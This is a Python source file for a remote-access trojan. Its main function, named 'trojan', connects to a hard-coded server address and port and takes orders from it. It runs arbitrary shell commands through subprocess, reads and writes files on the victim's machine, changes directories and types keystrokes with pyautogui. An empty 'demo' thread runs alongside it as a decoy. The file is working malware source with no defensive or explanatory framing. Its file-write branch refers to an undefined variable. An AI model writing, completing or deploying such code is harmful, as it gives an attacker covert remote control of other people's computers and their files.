import socket , threading , os , subprocess , time , pyautogui

def files(server_command):
	if server_command=='read':
		client.send('specify the file_name and mode to read'.encode('utf-8'))
		file , mode = client.recv(1024).decode('utf-8').split()
		with open(file,mode) as f:
			client.send(f.read().encode('utf-8'))

	elif server_command=='write':
		client.send('specify the file_name and mode to write'.encode('utf-8'))
		file , mode , data= client.recv(1024).decode('utf-8').split()
		with open(file,mode) as f:
			f.write(file_data)
		client.send('file updated'.encode('utf-8'))

def terminal_controll(server_command):
	global cmd_mode
	if server_command=='cmd_on':
		cmd_mode = True
		client.send('you now have terminal access'.encode('utf-8'))

	elif server_command=='cmd_off':
		cmd_mode = False
		client.send('exited from terminal access'.encode('utf-8'))
	
def write(option):
	if option==1:
		for i in client.recv(1024).decode('utf-8'):
			pyautogui.typewrite(i)
	elif option==2:
		while True:
			string = client.recv(1024).decode('utf-8')
			if string=='exit':
				break
			for i in string:
				pyautogui.typewrite(i)



def demo():
	pass


def trojan():
	global client,cmd_mode
	HOST = '192.168.43.98'  ######
	PORT = 9090
	cmd_mode = False

	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	client.connect((HOST, PORT))

	while True:
		server_command = client.recv(1024).decode('utf-8')

		if server_command[:3]=='cmd':
			terminal_controll(server_command)
			continue

		elif server_command[:4] in ('read','write'):
			files(server_command)
			continue

		elif server_command[:2]=='cd':
			os.chdir(server_command.split()[1])
			client.send(os.getcwd().encode('utf-8'))
			continue

		elif server_command=='type':
			option=int(client.recv(1024).decode('utf-8'))
			write(option)



		if cmd_mode:
			p1=subprocess.run(server_command,shell=True,capture_output=True,text=True)
			client.send(p1.stdout.encode('utf-8'))
		else:
			print(server_command)


		client.send('\ncommand was executed\n'.encode('utf-8'))









t1=threading.Thread(target=demo)
t2=threading.Thread(target=trojan)

t1.start()
t2.start()